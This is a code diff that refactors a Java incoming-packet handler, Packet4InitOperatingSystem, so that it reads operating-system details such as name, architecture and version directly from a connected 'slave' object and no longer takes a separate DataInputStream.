@@ -12,19 +12,17 @@ import oslib.macos.MacOSVersion;
 import oslib.solaris.SolarisOperatingSystem;
 import oslib.windows.WindowsOperatingSystem;
 
-import java.io.DataInputStream;
-
 public class Packet4InitOperatingSystem extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {	
+	public void read(Slave slave) throws Exception {
 		String name = slave.readLine();
 		String details = slave.readLine();
 		String sarch = slave.readLine();
 		String sde = slave.readLine();
 		String deversion = null;
 		
-		if (dis.readBoolean()) {
+		if (slave.readBoolean()) {
 			deversion = slave.readLine();
 		}
 
@@ -43,11 +41,11 @@ public class Packet4InitOperatingSystem extends AbstractIncomingPacket {
 			String codename = null;
 			String release = null;
 
-			if (dis.readBoolean()) {
+			if (slave.readBoolean()) {
 				codename = slave.readLine();
 			}
 
-			if (dis.readBoolean()) {
+			if (slave.readBoolean()) {
 				release = slave.readLine();
 			}
 
@@ -60,7 +58,7 @@ public class Packet4InitOperatingSystem extends AbstractIncomingPacket {
 		} else if (type == OperatingSystem.MACOS) {
 			MacOSVersion version = null;
 
-			if (dis.readBoolean()) {
+			if (slave.readBoolean()) {
 				String display = slave.readLine();
 				String ver = slave.readLine();
 
